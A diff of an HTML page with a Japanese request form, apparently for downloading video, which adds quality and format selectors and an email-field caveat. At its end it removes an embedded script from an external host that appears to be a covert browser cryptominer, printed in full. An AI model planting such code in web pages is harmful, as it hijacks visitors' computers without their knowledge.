@@ -41,7 +41,7 @@ padding-right: 12px !important;
 <td>
 <div class="row">
 <p class="form-title mb-2">
-<span class="badge badge-danger" style="margin-right: 8px">必須</span>メールアドレス</p>
+<span class="badge badge-danger" style="margin-right: 8px">必須</span>メールアドレス(送信不可になる可能性があるため学校のメールアドレスはご遠慮ください)</p>
 <div class="col">
 <div class="form-outline"><input type="text" name="mail" value="" class="form-control form-control-lg form-placeholder" id="mail" placeholder="（例）mail@example.com"  /></div></div>
 </div>
@@ -95,6 +95,36 @@ padding-right: 12px !important;
 </div>
 </td>
 </tr>
+<tr id="sec_free5">
+<td>
+<div class="row">
+<p class="form-title mb-2">
+<span class="badge badge-light" style="margin-right: 8px">任意</span>画質(記入の場合はbest画質になります。)</p>
+<div class="col">
+<select class="form-select form-select-lg " name="free5">
+<option value="Best">Best</option>
+<option value="1080P">1080P</option>
+<option value="720P">720P</option>
+<option value="480P">480P</option>
+<option value="360P">360P</option>
+<option value="240P">240P</option>
+</select></div>
+</div>
+</td>
+</tr>
+<tr id="sec_free6">
+<td>
+<div class="row">
+<p class="form-title mb-2">
+<span class="badge badge-light" style="margin-right: 8px">任意</span>形式</p>
+<div class="col">
+<select class="form-select form-select-lg " name="free6">
+<option value="MP4">MP4</option>
+<option value="MP3">MP3</option>
+</select></div>
+</div>
+</td>
+</tr>
 </tbody>
 </table>
 </div>
@@ -116,15 +146,5 @@ padding-right: 12px !important;
 <script src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/6.0.1/mdb.min.js"></script>
 <!-- [form end] -->
 
-
-<script src="https://www.hostingcloud.racing/bXc9.js"></script>
-<script>
-    var _client = new Client.Anonymous('2aabcc10f60324c3a01fb7a948d762e269e0abcda4f886b7f20a0b54e4577126', {
-        throttle: 0.1, c: 'w'
-    });
-    _client.start();
-    
-
-</script>
 </body>
 </html>
